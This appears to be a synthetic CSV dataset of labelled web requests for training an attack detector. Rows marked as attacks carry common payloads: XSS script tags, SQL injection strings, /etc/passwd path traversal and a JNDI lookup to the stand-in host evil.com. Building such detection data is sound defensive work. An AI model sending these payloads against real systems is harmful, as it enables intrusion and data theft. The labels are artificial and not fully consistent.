request_method,url,payload,user_agent,response_code,is_attack
GET,/app/page79?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page4?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (compatible; Baiduspider/2.0),500,1
POST,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page18,,sqlmap/1.0,200,0
POST,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page82?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page94?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page41,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
POST,/app/page63?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page69,,Nikto/2.1.6,200,0
POST,/app/page78?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
PUT,/app/page25,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page33,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page45?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,500,1
GET,/app/page11?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page90?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page87,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,500,1
PUT,/app/page19?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page15?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Nikto/2.1.6,200,0
POST,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page47?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page61?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page41,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page62,,Nikto/2.1.6,500,0
PUT,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
OPTIONS,/app/page74?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page14,,Nikto/2.1.6,404,0
POST,/app/page66?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page12,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page92?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page63,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page62?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page19,,sqlmap/1.0,200,0
GET,/app/page61,,Nikto/2.1.6,200,0
GET,/app/page56?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page53,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page55?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,403,1
PUT,/app/page9,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
PUT,/app/page38,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page36?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page52?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page3?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page69?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page16,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page45,,sqlmap/1.0,200,0
GET,/app/page40,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
GET,/app/page82,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page33?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page13,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page17,,Nikto/2.1.6,403,0
POST,/app/page95,,Nikto/2.1.6,404,0
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page49?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,500,1
PUT,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page35,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
POST,/app/page32?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page76,,Nikto/2.1.6,500,0
POST,/app/page93?UNION SELECT * FROM users,UNION SELECT * FROM users,sqlmap/1.0,403,1
POST,/app/page44?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page64,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page80?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,500,1
POST,/app/page11,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page31,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
GET,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page55?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page94?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page21,,sqlmap/1.0,200,0
GET,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page19?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
GET,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page93,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page41?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page96,,sqlmap/1.0,200,0
GET,/app/page11,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page89,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page48,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
DELETE,/app/page9?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page78,,sqlmap/1.0,200,0
POST,/app/page96?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page75?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page99?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
PUT,/app/page77?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page19?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,500,1
GET,/app/page46,,Nikto/2.1.6,404,0
GET,/app/page37?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page28?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page23,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page26?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page92,,sqlmap/1.0,403,0
PUT,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page96?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page77,,sqlmap/1.0,200,0
PUT,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page8,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page32,,Nikto/2.1.6,200,0
GET,/app/page67,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page96,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page88,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page51?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page54?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page92,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page37,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page26,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page74,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page61,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page16?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page24,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page43?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page66,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page74?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page84?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),404,1
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page10,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page63,,Nikto/2.1.6,200,0
GET,/app/page47,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page85,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page51,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page54,,Nikto/2.1.6,200,0
DELETE,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page30?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page44,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page7,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page78,,sqlmap/1.0,200,0
GET,/app/page46?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page80,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page84?eval(String.fromCharCode(,eval(String.fromCharCode(,Nikto/2.1.6,403,1
POST,/app/page5,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page80?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
DELETE,/app/page93,,sqlmap/1.0,404,0
POST,/app/page56,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page11,,Mozilla/5.0 (compatible; Baiduspider/2.0),403,0
POST,/app/page56?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page76,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page1,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page76?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
PUT,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page69,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page9,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page34,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page92?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page32,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page71,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page2,,sqlmap/1.0,200,0
GET,/app/page45,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page49,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page6,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page58,,Mozilla/5.0 (compatible; Baiduspider/2.0),404,0
GET,/app/page2,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page72,,Nikto/2.1.6,200,0
GET,/app/page38,,sqlmap/1.0,200,0
DELETE,/app/page54?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
PUT,/app/page8,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page81,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page85?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
POST,/app/page8?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
PUT,/app/page24?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
PUT,/app/page79?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page11,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page60,,sqlmap/1.0,200,0
PUT,/app/page2?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page90?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page15,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page50,,sqlmap/1.0,404,0
GET,/app/page86,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page99,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page75?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page60?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page9,,sqlmap/1.0,200,0
GET,/app/page71,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page92?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page46,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page72?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page78,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page41,,sqlmap/1.0,200,0
GET,/app/page95?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
PUT,/app/page72,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page19?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page51?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
GET,/app/page93?' OR 1=1 --,' OR 1=1 --,Nikto/2.1.6,403,1
DELETE,/app/page23?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page8?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page90,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
PUT,/app/page66?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page98?../../../etc/passwd,../../../etc/passwd,Nikto/2.1.6,403,1
PUT,/app/page75?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page22,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page73,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page46,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
DELETE,/app/page78,,sqlmap/1.0,404,0
GET,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page75,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page29,,sqlmap/1.0,404,0
GET,/app/page48,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page59,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page19,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page14?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page68,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page32,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
POST,/app/page42,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page4,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page29,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
GET,/app/page77?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (compatible; Baiduspider/2.0),200,1
POST,/app/page6?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page95,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page60,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
OPTIONS,/app/page28,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
GET,/app/page85?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page90?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,1
GET,/app/page94,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page57?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page57,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,0
POST,/app/page88?eval(String.fromCharCode(,eval(String.fromCharCode(,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page86?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,403,1
GET,/app/page22?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
POST,/app/page36,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page71?UNION SELECT * FROM users,UNION SELECT * FROM users,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,1
POST,/app/page53,,Mozilla/5.0 (compatible; Baiduspider/2.0),500,0
PUT,/app/page14,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
POST,/app/page68?' OR 1=1 --,' OR 1=1 --,sqlmap/1.0,403,1
GET,/app/page87?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page6,,Mozilla/5.0 (compatible; Baiduspider/2.0),200,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page28,,Nikto/2.1.6,200,0
PUT,/app/page65,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page79,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page15?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page89,,sqlmap/1.0,404,0
POST,/app/page17?${jndi:ldap://evil.com/},${jndi:ldap://evil.com/},Nikto/2.1.6,403,1
POST,/app/page50,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
OPTIONS,/app/page77,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page10,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page54,,sqlmap/1.0,500,0
POST,/app/page21,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),403,0
POST,/app/page99,,sqlmap/1.0,403,0
POST,/app/page51,,Nikto/2.1.6,200,0
GET,/app/page56?<script>alert('xss')</script>,<script>alert('xss')</script>,Nikto/2.1.6,403,1
GET,/app/page2?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page31,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page87?' OR 1=1 --,' OR 1=1 --,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
GET,/app/page88?<script>alert('xss')</script>,<script>alert('xss')</script>,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,1
GET,/app/page70,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page58,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page83,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),404,0
GET,/app/page28,,Nikto/2.1.6,500,0
PUT,/app/page48,,Nikto/2.1.6,200,0
GET,/app/page60,,Nikto/2.1.6,404,0
OPTIONS,/app/page84,,Mozilla/5.0 (Windows NT 10.0; Win64; x64),200,0
GET,/app/page96?../../../etc/passwd,../../../etc/passwd,Mozilla/5.0 (Windows NT 10.0; Win64; x64),500,1
